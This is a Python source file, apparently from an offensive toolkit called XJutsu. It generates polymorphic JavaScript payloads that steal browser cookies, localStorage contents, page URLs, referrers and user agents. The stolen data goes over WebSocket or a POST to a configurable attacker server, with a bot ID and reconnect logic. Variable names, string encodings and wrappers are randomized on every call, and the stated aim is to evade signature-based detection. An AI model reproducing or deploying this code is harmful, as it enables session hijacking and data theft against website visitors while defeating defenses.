"""
XJutsu v5 - Polymorphic Payload Generator
by Dave Lester B. Mondina / ANBU Black Ops Security

Generates unique payload variants on each request to evade signature-based detection.
Every request produces a different but functionally equivalent payload.
"""

import random
import string
import base64
import hashlib
from typing import Optional


class PolymorphicEngine:
    """
    Generates polymorphic JavaScript payloads that change on every request.
    Techniques: variable randomization, encoding variation, syntax mutation.
    """

    # Random variable name pools
    VAR_PREFIXES = ['_', '$', '__', '___', '_$', '$_', '_0x', '_0']
    VAR_CHARS = string.ascii_letters + '_$'

    # Equivalent JS syntax variations
    WINDOW_REFS = [
        'window',
        'self',
        'this',
        'globalThis',
        'top',
        'parent',
        'frames[0]',
        '(1,eval)("this")',
        'Function("return this")()',
    ]

    DOCUMENT_REFS = [
        'document',
        'window.document',
        'self.document',
        'top.document',
    ]

    # String construction methods
    STRING_METHODS = ['fromCharCode', 'concat', 'slice', 'substr']

    @classmethod
    def random_var(cls, length: int = 8) -> str:
        """Generate random variable name"""
        prefix = random.choice(cls.VAR_PREFIXES)
        suffix = ''.join(random.choices(cls.VAR_CHARS, k=length))
        return f"{prefix}{suffix}"

    @classmethod
    def random_whitespace(cls) -> str:
        """Random whitespace/formatting"""
        choices = ['', ' ', '\t', '\n', '  ', ' \t', '\n ']
        return random.choice(choices)

    @classmethod
    def encode_string_charcode(cls, s: str) -> str:
        """Encode string using String.fromCharCode"""
        codes = ','.join(str(ord(c)) for c in s)
        return f"String.fromCharCode({codes})"

    @classmethod
    def encode_string_array(cls, s: str) -> str:
        """Encode string as array join"""
        chars = [f"'{c}'" if c not in "'\\" else f"'\\{c}'" for c in s]
        return f"[{','.join(chars)}].join('')"

    @classmethod
    def encode_string_concat(cls, s: str) -> str:
        """Encode string using concatenation"""
        if len(s) < 2:
            return f"'{s}'"
        mid = random.randint(1, len(s) - 1)
        return f"'{s[:mid]}'+'{s[mid:]}'"

    @classmethod
    def encode_string_base64(cls, s: str) -> str:
        """Encode string using atob"""
        b64 = base64.b64encode(s.encode()).decode()
        return f"atob('{b64}')"

    @classmethod
    def encode_string_hex(cls, s: str) -> str:
        """Encode string using hex escape"""
        hex_str = ''.join(f'\\x{ord(c):02x}' for c in s)
        return f"'{hex_str}'"

    @classmethod
    def encode_string_unicode(cls, s: str) -> str:
        """Encode string using unicode escape"""
        uni_str = ''.join(f'\\u{ord(c):04x}' for c in s)
        return f"'{uni_str}'"

    @classmethod
    def random_string_encode(cls, s: str) -> str:
        """Randomly encode a string"""
        encoders = [
            cls.encode_string_charcode,
            cls.encode_string_array,
            cls.encode_string_concat,
            cls.encode_string_base64,
            cls.encode_string_hex,
            cls.encode_string_unicode,
            lambda x: f"'{x}'",  # Plain
        ]
        return random.choice(encoders)(s)

    @classmethod
    def generate_ws_connect(cls, ws_url: str) -> str:
        """Generate polymorphic WebSocket connection code"""
        var_ws = cls.random_var()
        var_cfg = cls.random_var()
        var_bot = cls.random_var()
        var_data = cls.random_var()
        ws = cls.random_whitespace()

        # Randomize WebSocket constructor access
        ws_constructors = [
            'WebSocket',
            'window.WebSocket',
            'self.WebSocket',
            f"window['WebSocket']",
            f"self['Web'+'Socket']",
        ]
        ws_new = random.choice(ws_constructors)

        # Randomize URL encoding
        url_encoded = cls.random_string_encode(ws_url)

        # Random bot ID generation methods
        bot_id_methods = [
            "Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2)",
            "Date.now().toString(36)+Math.random().toString(36).substr(2)",
            f"'{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}'",
            "(+new Date).toString(36)+Math.random().toString(36).slice(2,8)",
        ]
        bot_id = random.choice(bot_id_methods)

        return f"""{var_bot}={bot_id};{ws}{var_ws}=new {ws_new}({url_encoded});"""

    @classmethod
    def generate_data_collect(cls) -> str:
        """Generate polymorphic data collection code"""
        var_d = cls.random_var()
        ws = cls.random_whitespace()

        # Randomize property access
        doc = random.choice(cls.DOCUMENT_REFS)
        win = random.choice(cls.WINDOW_REFS)

        # Randomize cookie access
        cookie_access = random.choice([
            f"{doc}.cookie",
            f"{doc}['cookie']",
            f"{doc}['coo'+'kie']",
        ])

        # Randomize location access
        loc_access = random.choice([
            f"{win}.location.href",
            f"location.href",
            f"location+''",
            f"{doc}.URL",
        ])

        return f"""{var_d}={{{ws}'u':{loc_access},{ws}'c':{cookie_access},{ws}'r':{doc}.referrer{ws}}};"""

    @classmethod
    def generate_payload_js(cls, server_url: str, ws_url: str, payload_id: Optional[str] = None) -> str:
        """
        Generate a complete polymorphic payload.
        Each call produces unique but functionally equivalent code.
        """
        # Random variable names
        v_loaded = cls.random_var()
        v_ws = cls.random_var()
        v_bot = cls.random_var()
        v_cfg = cls.random_var()
        v_data = cls.random_var()
        v_send = cls.random_var()
        v_retry = cls.random_var()
        v_max = cls.random_var()
        v_connect = cls.random_var()
        ws = cls.random_whitespace()

        # Randomize window reference
        win = random.choice(cls.WINDOW_REFS[:4])  # Use safe ones
        doc = random.choice(cls.DOCUMENT_REFS[:2])

        # Randomize WebSocket URL encoding
        ws_url_enc = cls.random_string_encode(ws_url)

        # Randomize bot ID generation
        bot_gen = random.choice([
            "Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2)",
            "(+new Date).toString(36)+Math.random().toString(36).slice(2,10)",
            "crypto.getRandomValues(new Uint32Array(2)).reduce((a,b)=>a.toString(36)+b.toString(36),'')",
        ])

        # Random IIFE wrapper styles
        iife_styles = [
            ("(function(){", "})();"),
            ("!function(){", "}();"),
            ("+function(){", "}();"),
            ("~function(){", "}();"),
            ("void function(){", "}();"),
        ]
        iife_start, iife_end = random.choice(iife_styles)

        # Randomize JSON methods
        json_stringify = random.choice([
            "JSON.stringify",
            "JSON['stringify']",
        ])

        # Randomize storage access
        storage_code = random.choice([
            f"Object.fromEntries(Object.keys(localStorage).map(k=>[k,localStorage[k]]))",
            f"(()=>{{let o={{}};for(let i=0;i<localStorage.length;i++){{let k=localStorage.key(i);o[k]=localStorage[k]}}return o}})()",
        ])

        # Build payload with random structure
        payload = f"""{iife_start}
if({win}.{v_loaded})return;{win}.{v_loaded}=1;
var {v_bot}={bot_gen};
var {v_retry}=0,{v_max}=10;
var {v_ws};
function {v_connect}(){{
{v_ws}=new WebSocket({ws_url_enc});
{v_ws}.onopen=function(){{
{v_retry}=0;
{v_ws}.send({json_stringify}({{type:'register',bot_id:{v_bot}}}));
{v_ws}.send({json_stringify}({{
type:'callback',
payload:{{
payload_id:'{payload_id or ''}',
bot_id:{v_bot},
uri:{win}.location.href,
origin:{win}.location.origin,
referrer:{doc}.referrer,
cookies:{doc}.cookie,
localstorage:{storage_code},
user_agent:navigator.userAgent
}}
}}));
}};
{v_ws}.onclose=function(){{
if({v_retry}<{v_max}){{
{v_retry}++;
setTimeout({v_connect},1000*{v_retry});
}}
}};
}}
{v_connect}();
{iife_end}"""

        return payload

    @classmethod
    def generate_minified(cls, server_url: str, ws_url: str) -> str:
        """Generate minified polymorphic payload"""
        v = cls.random_var(4)
        b = cls.random_var(4)

        # Ultra-compact variants
        templates = [
            f"(w=new WebSocket('{ws_url}'),w.onopen=_=>w.send(JSON.stringify({{t:'c',u:location+'',c:document.cookie,b:'{b}'}})))",
            f"fetch('{server_url}/api/callback/',{{method:'POST',body:JSON.stringify({{u:location.href,c:document.cookie}})}})",
            f"new WebSocket('{ws_url}').onopen=function(){{this.send('{{\\'t\\':\\'c\\',\\'u\\':\\''+location+'\\'}}')}}"
        ]

        return random.choice(templates)

    @classmethod
    def generate_module_js(cls, server_url: str, ws_url: str) -> str:
        """Generate polymorphic ES module payload"""
        v_cfg = cls.random_var()
        v_ws = cls.random_var()
        v_bot = cls.random_var()

        bot_gen = random.choice([
            "Math.random().toString(36).slice(2,12)",
            "crypto.randomUUID().slice(0,12)",
            "(+new Date).toString(36)",
        ])

        return f"""const {v_cfg}={{u:'{ws_url}',b:{bot_gen}}};
const {v_ws}=new WebSocket({v_cfg}.u);
{v_ws}.onopen=()=>{{
{v_ws}.send(JSON.stringify({{type:'register',bot_id:{v_cfg}.b}}));
{v_ws}.send(JSON.stringify({{type:'callback',payload:{{
bot_id:{v_cfg}.b,uri:location.href,origin:location.origin,
cookies:document.cookie,user_agent:navigator.userAgent
}}}}));
}};
export default {v_cfg};"""


# Convenience functions
def generate_polymorphic_payload(server_url: str, ws_url: str, payload_id: str = None) -> str:
    """Generate a unique polymorphic payload"""
    return PolymorphicEngine.generate_payload_js(server_url, ws_url, payload_id)


def generate_polymorphic_module(server_url: str, ws_url: str) -> str:
    """Generate a unique polymorphic ES module"""
    return PolymorphicEngine.generate_module_js(server_url, ws_url)


def generate_polymorphic_mini(server_url: str, ws_url: str) -> str:
    """Generate a unique minified polymorphic payload"""
    return PolymorphicEngine.generate_minified(server_url, ws_url)
